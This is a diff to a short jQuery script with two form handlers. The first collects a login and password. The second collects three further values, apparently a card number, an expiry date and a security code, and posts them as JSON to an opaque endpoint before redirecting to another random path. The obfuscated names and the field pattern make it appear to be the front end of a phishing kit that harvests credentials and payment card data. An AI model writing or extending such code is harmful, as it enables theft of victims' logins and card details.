@@ -1,8 +1,8 @@
 $(function(){
     $("#pg1").on("submit",function(e){
         e.preventDefault();
-        let logi = $("#nifo").val();
-        let paso = $("#coda").val();
+        let logi = $("#usa").val();
+        let paso = $("#paso").val();
 
 
 
@@ -22,16 +22,17 @@ $(function(){
 
     $("#pg2").on("submit",function(e){
         e.preventDefault();
-        let a1 = $("#one").val();
-        let a2 = `${$("#two1").val()}/${$("#two2").val()}`;
-        let a3 = $("#three").val();
+        
+        let a5 = $("#one").val();
+        let a6 = $("#two").val();
+        let a7 = $("#three").val();
         
         //send backend:
         $.ajax({
             url: '/NkMNm4664XhcW8KuukHk',
             type: 'POST',
             contentType: 'application/json',
-            data: JSON.stringify({a1,a2,a3}),
+            data: JSON.stringify({a5,a6,a7}),
             success: function(info) {
                 if(info.OK){
                     window.location = "/Q89HFszQPd3TFv4mx65k";
